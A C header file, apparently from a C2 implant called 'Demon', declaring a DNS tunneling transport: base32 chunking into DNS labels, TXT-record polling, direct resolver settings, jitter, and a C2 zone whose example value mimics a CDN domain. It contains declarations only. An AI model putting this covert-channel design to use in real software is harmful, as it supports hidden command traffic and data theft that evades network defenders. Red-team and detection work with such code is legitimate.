#ifndef DEMON_TRANSPORT_DNS_H
#define DEMON_TRANSPORT_DNS_H

#ifdef TRANSPORT_DNS

#include <windows.h>
#include <windns.h>

/* Max binary bytes per DNS label (30 bytes → 48 base32 chars, fits in 63-char label limit) */
#define DNS_CHUNK_BYTES      30
#define DNS_LABEL_MAX        63
#define DNS_SEQ_INIT         0x0001
/* Max downlink TXT poll iterations per send cycle before timeout.
 * Each iteration retrieves 189 bytes; 65535 iterations = ~12 MB max,
 * enough for any realistic command response. */
#define DNS_POLL_MAX_ITER    65535
#define DNS_RETRY_MAX        3

/* Downlink TXT query prefix that distinguishes polls from uplink A queries */
#define DNS_POLL_PREFIX      "p"

typedef struct _DNS_CONFIG {
    LPWSTR  ZoneDomain;           /* C2 zone, e.g. L"updates.company-cdn.net" */
    DWORD   ResolverCount;
    LPWSTR  Resolvers[ 8 ];       /* NS IPs to query directly (up to 8) */
    WORD    Port;                 /* UDP/TCP port, default 53 */
    DWORD   QueryTimeout;         /* ms per query, 0 → default 4000 */
    DWORD   ChunkDelayMs;         /* inter-chunk delay for jitter, 0 → none */
} DNS_CONFIG, *PDNS_CONFIG;

BOOL  DnsTransportInit  ( VOID );
BOOL  DnsSend           ( PBUFFER SendData, PBUFFER RecvData );

VOID  DnsBase32Encode   ( PBYTE In, DWORD InLen, PCHAR Out );
DWORD DnsBase32Decode   ( PCHAR In, DWORD InLen, PBYTE Out );

#endif /* TRANSPORT_DNS */
#endif /* DEMON_TRANSPORT_DNS_H */
